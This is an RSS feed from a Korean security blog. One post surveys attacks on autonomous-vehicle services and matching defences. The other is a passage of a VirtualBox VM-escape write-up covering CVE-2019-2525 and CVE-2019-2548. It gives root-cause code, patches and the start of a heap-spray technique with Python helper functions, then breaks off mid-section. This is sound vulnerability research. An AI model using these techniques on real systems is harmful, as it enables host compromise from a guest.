<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>rvkhunLab</title>
    <link>https://pwnkidhn.github.io/</link>
    
    <atom:link href="https://pwnkidhn.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>Security Researcher / CTF Player</description>
    <pubDate>Tue, 02 Nov 2021 13:05:22 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>Automotive Security Model</title>
      <link>https://pwnkidhn.github.io/2021/11/01/2021-11-02-Automotive_service/</link>
      <guid>https://pwnkidhn.github.io/2021/11/01/2021-11-02-Automotive_service/</guid>
      <pubDate>Mon, 01 Nov 2021 15:00:00 GMT</pubDate>
      
      <description>&lt;h2 id=&quot;자율주행차-서비스&quot;&gt;&lt;a href=&quot;#자율주행차-서비스&quot; class=&quot;headerlink&quot; title=&quot;자율주행차 서비스&quot;&gt;&lt;/a&gt;자율주행차 서비스&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/49066484/139845220-3a0c063c-590a-4d89-9e16-95e43bdf8a1c.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;자율주행차 서비스로는 셔틀 및 온-디멘드, 카쉐어링, 주차, 배송, 군집 주행, 어시스턴트, C-ITS 등이 있다.&lt;/li&gt;
&lt;li&gt;차량은 V2X 통신을 위하여 셀룰러 통신, WAVE통신 등을 한다.&lt;/li&gt;
&lt;li&gt;셔틀 및 온-디멘스, 배송 서비스 등은 차량의 각종 정보를 백엔드 인프라로 전송한다.&lt;/li&gt;
&lt;li&gt;군집 주행 및 어시스턴트 서비스는 차량 간 정보를 공유하며 원격 제어 등 편의 기능을 제공한다.&lt;/li&gt;
&lt;li&gt;C-ITS 서비스는 주행 중에 필요한 교통 상황과 도로정보를 실시간으로 제공한다.&lt;/li&gt;
&lt;li&gt;자율주행차 서비스 보안 부분으로는 차량 보안, 백엔드 인프라 보안, 통신 채널 보안 등이 있다.&lt;/li&gt;
&lt;/ul&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="자율주행차-서비스"><a href="#자율주행차-서비스" class="headerlink" title="자율주행차 서비스"></a>자율주행차 서비스</h2><p><img src="https://user-images.githubusercontent.com/49066484/139845220-3a0c063c-590a-4d89-9e16-95e43bdf8a1c.png" alt="1"></p><ul><li>자율주행차 서비스로는 셔틀 및 온-디멘드, 카쉐어링, 주차, 배송, 군집 주행, 어시스턴트, C-ITS 등이 있다.</li><li>차량은 V2X 통신을 위하여 셀룰러 통신, WAVE통신 등을 한다.</li><li>셔틀 및 온-디멘스, 배송 서비스 등은 차량의 각종 정보를 백엔드 인프라로 전송한다.</li><li>군집 주행 및 어시스턴트 서비스는 차량 간 정보를 공유하며 원격 제어 등 편의 기능을 제공한다.</li><li>C-ITS 서비스는 주행 중에 필요한 교통 상황과 도로정보를 실시간으로 제공한다.</li><li>자율주행차 서비스 보안 부분으로는 차량 보안, 백엔드 인프라 보안, 통신 채널 보안 등이 있다.</li></ul><span id="more"></span><h2 id="자율주행차-서비스-보안-위협"><a href="#자율주행차-서비스-보안-위협" class="headerlink" title="자율주행차 서비스 보안 위협"></a>자율주행차 서비스 보안 위협</h2><p><img src="https://user-images.githubusercontent.com/49066484/139849656-b515d48d-ede2-48ae-b5ab-653bbb622850.png" alt="2"></p><ul><li><p>차량과 벡엔드 인프라가 통신할 때 공격자는 도청 및 데이터 변조를 수행할 수 있고, 백엔드 인프라에 대하여 DoS와 같은 직접적인 공격을 수행할 수 있다.</p></li><li><p>차량에 대해서는 차량 제어기의 인터페이스를 통하여 송수신되는 데이터 또는 저장된 데이터를 도청, 변조하거나 업데이트 패키지를 위변조하여 공격을 수행할 수 있다.</p></li><li><p>차량에 대한 공격</p><ul><li>펌웨어 변조</li><li>차량 원격제어 해킹</li><li>CAN 위변조</li><li>차량 불법 조작</li><li>DoS</li></ul></li><li><p>통신채널에 대한 공격</p><ul><li>통신 도청</li><li>통신 메시지 위변조</li><li>정보 무단 획득</li><li>거짓 정보 제공</li><li>부인</li></ul></li><li><p>백엔드 인프라에 대한 공격</p><ul><li>정보 유출</li><li>권한 상승</li><li>DoS</li></ul></li><li><p>위를 포함한 다양한 어택 벡터가 존재한다.</p></li></ul><h2 id="자율주행차-서비스-보안기술-및-솔루션"><a href="#자율주행차-서비스-보안기술-및-솔루션" class="headerlink" title="자율주행차 서비스 보안기술 및 솔루션"></a>자율주행차 서비스 보안기술 및 솔루션</h2><p><img src="https://user-images.githubusercontent.com/49066484/139851217-951e2cb6-7cb4-49f7-adde-bb94741552cc.png" alt="3"></p><ul><li>보안위협별 대응 보안기술은 아래와 같다.</li><li>차량에 대한 공격 대응 기술<ul><li>펌웨어 변조 : Hardware Security Model, Secure Boot, Secure Debug, Secure Diagnosis …</li><li>차량 원격제어 해킹 : Secure Access, IDS, SecOS …</li><li>CAN 위변조 : IDS, SecOS, Secure Software Update …</li><li>차량 불법 조작 : Secure Access, Secure Diagnosis …</li><li>DoS : IDS</li></ul></li><li>통신채널에 대한 공격 대응 기술<ul><li>통신 도청 : IPSec, TLS/DTLS, WAVE 통신 보안 기술 …</li><li>통신 메시지 위변조 : IPSec, TLS/DTLS, WAVE 통신 보안 기술 …</li><li>정보 무단 획득 : IPSec, TLS/DTLS, WAVE 통신 보안 기술 …</li><li>거짓 정보 제공 : IPSec, TLS/DTLS, WAVE 통신 보안 기술 …</li><li>부인 : IPSec, TLS/DTLS, WAVE 통신 보안 기술 …</li></ul></li><li>백엔드 인프라에 대한 공격 대응 기술<ul><li>정보 유출 : Firewall, DB Encryption, Access Control, Endpoint Detection &amp; Response …</li><li>권한 상승 : Access Control …</li><li>DoS : Firewall …</li></ul></li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li>https://한국인터넷진흥원.한국/jsp/common/downloadAction.jsp?bno=259&amp;dno=124&amp;fseq=1</li></ul>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Automotive/">Automotive</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/Automotive/">Automotive</category>
      
      <category domain="https://pwnkidhn.github.io/tags/Car/">Car</category>
      
      
      <comments>https://pwnkidhn.github.io/2021/11/01/2021-11-02-Automotive_service/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>VM Escape using CVE-2019-2525/2548 (2)</title>
      <link>https://pwnkidhn.github.io/2021/10/27/2021-10-28-CVE-2019-2525_2548_2/</link>
      <guid>https://pwnkidhn.github.io/2021/10/27/2021-10-28-CVE-2019-2525_2548_2/</guid>
      <pubDate>Wed, 27 Oct 2021 15:00:00 GMT</pubDate>
      
      <description>&lt;ul&gt;
&lt;li&gt;CVE-2019-2525와 CVE-2019-2548을 이용한 VM exploit.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;CVE-2019-2525&quot;&gt;&lt;a href=&quot;#CVE-2019-2525&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-2525&quot;&gt;&lt;/a&gt;CVE-2019-2525&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;OOB Read in crUnpackExtendGetAttribLocation&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;Root-Cause&quot;&gt;&lt;a href=&quot;#Root-Cause&quot; class=&quot;headerlink&quot; title=&quot;Root Cause&quot;&gt;&lt;/a&gt;Root Cause&lt;/h3&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;crUnpackExtendGetUniformLocation&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; packet_length = READ_DATA(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    GLuint program = READ_DATA(&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;, GLuint);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *name = DATA_POINTER(&lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SET_RETURN_PTR(packet_length&lt;span class=&quot;number&quot;&gt;-16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SET_WRITEBACK_PTR(packet_length&lt;span class=&quot;number&quot;&gt;-8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    cr_unpackDispatch.GetUniformLocation(program, name);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; SET_RETURN_PTR( offset ) do &amp;#123; \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;        CRDBGPTR_CHECKZ(return_ptr); \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;        crMemcpy( return_ptr, cr_unpackData + (offset), sizeof( *return_ptr ) ); \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;    &amp;#125; while (0);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; SET_WRITEBACK_PTR( offset ) do &amp;#123; \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;        CRDBGPTR_CHECKZ(writeback_ptr); \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;        crMemcpy( writeback_ptr, cr_unpackData + (offset), sizeof( *writeback_ptr ) ); \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;    &amp;#125; while (0);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;SET_XX(OFFSET)에서 crMemcpy(XX, cr_unpackData + OFFSET, 8) 연산 후, 값을 guest로 보낸다.&lt;/li&gt;
&lt;li&gt;이 때 OFFSET(packet_length)을  체크하지 않아 16바이트 Memory Leak이 가능하다.&lt;/li&gt;
&lt;/ul&gt;</description>
      
      
      
      <content:encoded><![CDATA[<ul><li>CVE-2019-2525와 CVE-2019-2548을 이용한 VM exploit.</li></ul><h2 id="CVE-2019-2525"><a href="#CVE-2019-2525" class="headerlink" title="CVE-2019-2525"></a>CVE-2019-2525</h2><ul><li>OOB Read in crUnpackExtendGetAttribLocation</li></ul><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">crUnpackExtendGetUniformLocation</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> packet_length = READ_DATA(<span class="number">0</span>, <span class="keyword">int</span>);</span><br><span class="line">    GLuint program = READ_DATA(<span class="number">8</span>, GLuint);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name = DATA_POINTER(<span class="number">12</span>, <span class="keyword">const</span> <span class="keyword">char</span>);</span><br><span class="line">    SET_RETURN_PTR(packet_length<span class="number">-16</span>);</span><br><span class="line">    SET_WRITEBACK_PTR(packet_length<span class="number">-8</span>);</span><br><span class="line">    cr_unpackDispatch.GetUniformLocation(program, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_RETURN_PTR( offset ) do &#123; \</span></span><br><span class="line"><span class="meta">        CRDBGPTR_CHECKZ(return_ptr); \</span></span><br><span class="line"><span class="meta">        crMemcpy( return_ptr, cr_unpackData + (offset), sizeof( *return_ptr ) ); \</span></span><br><span class="line"><span class="meta">    &#125; while (0);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_WRITEBACK_PTR( offset ) do &#123; \</span></span><br><span class="line"><span class="meta">        CRDBGPTR_CHECKZ(writeback_ptr); \</span></span><br><span class="line"><span class="meta">        crMemcpy( writeback_ptr, cr_unpackData + (offset), sizeof( *writeback_ptr ) ); \</span></span><br><span class="line"><span class="meta">    &#125; while (0);</span></span><br></pre></td></tr></table></figure><ul><li>SET_XX(OFFSET)에서 crMemcpy(XX, cr_unpackData + OFFSET, 8) 연산 후, 값을 guest로 보낸다.</li><li>이 때 OFFSET(packet_length)을  체크하지 않아 16바이트 Memory Leak이 가능하다.</li></ul><span id="more"></span><h3 id="How-to-patch"><a href="#How-to-patch" class="headerlink" title="How to patch"></a>How to patch</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">crUnpackExtendGetUniformLocation</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> packet_length = READ_DATA(<span class="number">0</span>, <span class="keyword">int</span>);</span><br><span class="line">    GLuint program = READ_DATA(<span class="number">8</span>, GLuint);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name = DATA_POINTER(<span class="number">12</span>, <span class="keyword">const</span> <span class="keyword">char</span>);</span><br><span class="line">    <span class="keyword">if</span> (!DATA_POINTER_CHECK(packet_length))</span><br><span class="line">    &#123;</span><br><span class="line">    crError(<span class="string">&quot;crUnpackExtendGetAttribLocation: packet_length is out of range&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    SET_RETURN_PTR(packet_length<span class="number">-16</span>);</span><br><span class="line">    SET_WRITEBACK_PTR(packet_length<span class="number">-8</span>);</span><br><span class="line">    cr_unpackDispatch.GetUniformLocation(program, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>OFFSET(packet_length)을 체크하는 조건문이 추가 되었다.</li></ul><hr><h2 id="CVE-2019-2548"><a href="#CVE-2019-2548" class="headerlink" title="CVE-2019-2548"></a>CVE-2019-2548</h2><ul><li>Integer Overflow in crServerDispatchReadPixels</li></ul><h3 id="Root-Cause-1"><a href="#Root-Cause-1" class="headerlink" title="Root Cause"></a>Root Cause</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> SERVER_DISPATCH_APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">crServerDispatchReadPixels</span><span class="params">(GLint x, GLint y, GLsizei width, GLsizei height,</span></span></span><br><span class="line"><span class="params"><span class="function">                           GLenum format, GLenum type, GLvoid *pixels)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> GLint stride = READ_DATA( <span class="number">24</span>, GLint );</span><br><span class="line">    <span class="keyword">const</span> GLint alignment = READ_DATA( <span class="number">28</span>, GLint );</span><br><span class="line">    <span class="keyword">const</span> GLint skipRows = READ_DATA( <span class="number">32</span>, GLint );</span><br><span class="line">    <span class="keyword">const</span> GLint skipPixels = READ_DATA( <span class="number">36</span>, GLint );</span><br><span class="line">    <span class="keyword">const</span> GLint bytes_per_row = READ_DATA( <span class="number">40</span>, GLint );</span><br><span class="line">    <span class="keyword">const</span> GLint rowLength = READ_DATA( <span class="number">44</span>, GLint );</span><br><span class="line"></span><br><span class="line">    CRASSERT(bytes_per_row &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CR_ARB_pixel_buffer_object</span></span><br><span class="line">    <span class="keyword">if</span> (crStateIsBufferBound(GL_PIXEL_PACK_BUFFER_ARB))</span><br><span class="line">    &#123;</span><br><span class="line">        GLvoid *pbo_offset;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*pixels are actually a pointer to location of 8byte network pointer in hgcm buffer</span></span><br><span class="line"><span class="comment">          regardless of guest/host bitness we&#x27;re using only 4lower bytes as there&#x27;re no</span></span><br><span class="line"><span class="comment">          pbo&gt;4gb (yet?)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        pbo_offset = (GLvoid*) ((<span class="keyword">uintptr_t</span>) *((GLint*)pixels));</span><br><span class="line"></span><br><span class="line">        cr_server.head_spu-&gt;dispatch_table.ReadPixels(x, y, width, height,</span><br><span class="line">                                                      format, type, pbo_offset);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#123;</span><br><span class="line">        CRMessageReadPixels *rp;</span><br><span class="line">        <span class="keyword">uint32_t</span> msg_len;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bytes_per_row &lt; <span class="number">0</span> || bytes_per_row &gt; UINT32_MAX / <span class="number">8</span> || height &gt; UINT32_MAX / <span class="number">8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            crError(<span class="string">&quot;crServerDispatchReadPixels: parameters out of range&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        msg_len = <span class="keyword">sizeof</span>(*rp) + (<span class="keyword">uint32_t</span>)bytes_per_row * height;</span><br><span class="line"></span><br><span class="line">        rp = (CRMessageReadPixels *) crAlloc( msg_len );</span><br><span class="line">        <span class="keyword">if</span> (!rp)</span><br><span class="line">        &#123;</span><br><span class="line">            crError(<span class="string">&quot;crServerDispatchReadPixels: out of memory&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Note: the ReadPixels data gets densely packed into the buffer</span></span><br><span class="line"><span class="comment">         * (no skip pixels, skip rows, etc.  It&#x27;s up to the receiver (pack spu,</span></span><br><span class="line"><span class="comment">         * tilesort spu, etc) to apply the real PixelStore packing parameters.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        cr_server.head_spu-&gt;dispatch_table.ReadPixels(x, y, width, height,</span><br><span class="line">                                                      format, type, rp + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        rp-&gt;header.type = CR_MESSAGE_READ_PIXELS;</span><br><span class="line">        rp-&gt;width = width;</span><br><span class="line">        rp-&gt;height = height;</span><br><span class="line">        rp-&gt;bytes_per_row = bytes_per_row;</span><br><span class="line">        rp-&gt;stride = stride;</span><br><span class="line">        rp-&gt;format = format;</span><br><span class="line">        rp-&gt;type = type;</span><br><span class="line">        rp-&gt;alignment = alignment;</span><br><span class="line">        rp-&gt;skipRows = skipRows;</span><br><span class="line">        rp-&gt;skipPixels = skipPixels;</span><br><span class="line">        rp-&gt;rowLength = rowLength;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* &lt;pixels&gt; points to the 8-byte network pointer */</span></span><br><span class="line">        crMemcpy( &amp;rp-&gt;pixels, pixels, <span class="keyword">sizeof</span>(rp-&gt;pixels) );</span><br><span class="line">    </span><br><span class="line">        crNetSend( cr_server.curClient-&gt;conn, <span class="literal">NULL</span>, rp, msg_len );</span><br><span class="line">        crFree( rp );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>crAlloc(msg_len)호출을 위해  msg_len값을 설정하는 부분에서 Integer Overflow가 발생한다.</li><li>항상 sizeof(rp)보다 큰 정수값을 반환할 거라 예상하지만 (sizeof(rp) == 0x38) ,</li><li>Integer Overflow를 통해 0x38보다 작은 특별한 크기 (0x20)으로 설정할 수 있다.</li><li>이를 이용해 Heap Overflow가 가능하다.</li></ul><h3 id="How-to-patch-1"><a href="#How-to-patch-1" class="headerlink" title="How to patch"></a>How to patch</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bytes_per_row &lt;= <span class="number">0</span> || height &lt;= <span class="number">0</span> || bytes_per_row &gt; INT32_MAX / height)</span><br><span class="line">&#123;</span><br><span class="line">    crError(<span class="string">&quot;crServerDispatchReadPixels: parameters out of range&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">msg_len = <span class="keyword">sizeof</span>(*rp) + (<span class="keyword">uint32_t</span>)bytes_per_row * height;</span><br><span class="line"></span><br><span class="line">rp = (CRMessageReadPixels *) crAlloc( msg_len );</span><br></pre></td></tr></table></figure><ul><li>검증 조건이 수정되었다.</li></ul><hr><h2 id="Heap-Spray"><a href="#Heap-Spray" class="headerlink" title="Heap Spray"></a>Heap Spray</h2><ul><li>CVE-2019-2548에서 msg_len을 특별한 크기 0x20으로 설정 할 수 있다고 했다.<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">CRVBOXSVCBUFFER_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> uiId;</span><br><span class="line">    <span class="keyword">uint32_t</span> uiSize;</span><br><span class="line">    <span class="keyword">void</span>*    pData;</span><br><span class="line">    _CRVBOXSVCBUFFER_t *pNext, *pPrev;</span><br><span class="line">&#125; CRVBOXSVCBUFFER_t;</span><br></pre></td></tr></table></figure></li><li>여기서 0x20은 CRVBOXSVCBUFFER_t  구조체의 크기이다. </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc_buf</span>(<span class="params">client, sz, msg=<span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">    buf,_,_,_ = hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [<span class="number">0</span>, sz, <span class="number">0</span>, msg])</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crmsg</span>(<span class="params">client, msg, bufsz=<span class="number">0x1000</span></span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; Allocate a buffer, write a Chromium message to it, and dispatch it. &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(msg) &lt;= bufsz</span><br><span class="line">    buf = alloc_buf(client, bufsz, msg)</span><br><span class="line">    <span class="comment"># buf,_,_,_ = hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0, bufsz, 0, msg])</span></span><br><span class="line">    _, res, _ = hgcm_call(client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [buf, <span class="string">&quot;A&quot;</span>*bufsz, <span class="number">1337</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><ul><li>alloc_buf에서 할당한 메모리는 crmsg가 호출되기 전까지 Free되지 않는다..</li><li>따라서 아래와 같이 Heap Spray가 가능하다.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/139065357-da746ae5-34e2-4b20-b5d1-b416ebc7b834.png" alt="1"></p><ul><li>alloc_buf함수 호출, 